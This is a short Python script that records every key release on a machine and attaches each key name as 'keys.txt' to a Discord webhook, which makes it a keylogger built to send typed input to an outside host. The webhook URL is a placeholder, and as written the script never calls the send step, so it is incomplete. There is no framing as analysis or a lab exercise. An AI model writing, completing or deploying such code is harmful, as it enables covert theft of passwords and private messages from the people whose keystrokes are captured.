import keyboard
from discord_webhook import DiscordWebhook

webhook = DiscordWebhook(url="https://discord.com/api/webhooks/123456/example")
def record(event):
    webhook.add_file(file=event.name.encode(), filename="keys.txt")
keyboard.on_release(record)
